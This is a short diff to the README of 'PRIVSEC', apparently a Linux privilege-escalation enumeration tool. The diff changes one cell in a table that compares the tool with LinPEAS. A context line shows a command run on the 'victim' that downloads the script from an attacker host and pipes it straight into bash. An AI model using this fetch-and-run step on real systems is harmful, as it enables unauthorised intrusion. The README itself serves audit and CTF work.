@@ -92,7 +92,7 @@ curl $HOSTIP/privsec.sh | bash #Victim
 | **Scope** | Focused (14 checks) | Comprehensive (100+ checks) |
 | **Speed** | 30-60 seconds | 2-5 minutes |
 | **Size** | ~25 KB | ~800 KB |
-| **Output** | Clean, statistical | Detailed, extensive |
+| **Output** | Minimal and Clean | Detailed, extensive |
 | **Use Case** | Quick audits, reporting | Full enumeration, CTFs |
 
 **Complementary Use:** Run PRIVSEC first for quick overview, then LinPEAS for deep dive.
